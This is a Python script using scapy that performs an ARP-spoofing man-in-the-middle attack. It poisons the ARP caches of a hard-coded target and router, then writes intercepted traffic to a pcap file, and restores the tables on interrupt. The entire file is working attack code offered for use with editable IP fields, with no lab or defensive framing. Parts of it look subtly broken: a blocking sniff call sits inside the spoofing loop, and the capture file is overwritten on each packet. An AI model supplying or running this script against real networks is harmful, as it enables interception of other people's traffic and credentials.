import scapy.all as scapy
import time

# ARP Spoof function
def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Get MAC address of the target
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

# Restore ARP tables of target and router
def restore_arp(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)
    packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, hwsrc=router_mac, psrc=router_ip)
    scapy.send(packet, count=4, verbose=False)

# Packet sniffer to capture data
def packet_sniffer(interface, filename):
    scapy.sniff(iface=interface, store=False, prn=lambda x: scapy.wrpcap(filename, x))

# Perform MitM attack
def mitm_attack(target_ip, router_ip, interface):
    try:
        sent_packets_count = 0
        while True:
            arp_spoof(target_ip, router_ip)
            arp_spoof(router_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[+] Packets Sent: " + str(sent_packets_count), end="")
            time.sleep(2)
            # Start packet sniffer after ARP spoofing
            packet_sniffer(interface, "log.pcap")
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL + C ..... Resetting ARP Tables.....Please wait.\n")
        restore_arp(target_ip, router_ip)
        restore_arp(router_ip, target_ip)

# Main function
if __name__ == '__main__':
    target_ip = "192.168.0.102" # Enter target IP
    router_ip = "192.168.0.1" # Enter router IP
    interface = "Ethernet" # Enter the name of the network interface to use
    mitm_attack(target_ip, router_ip, interface)
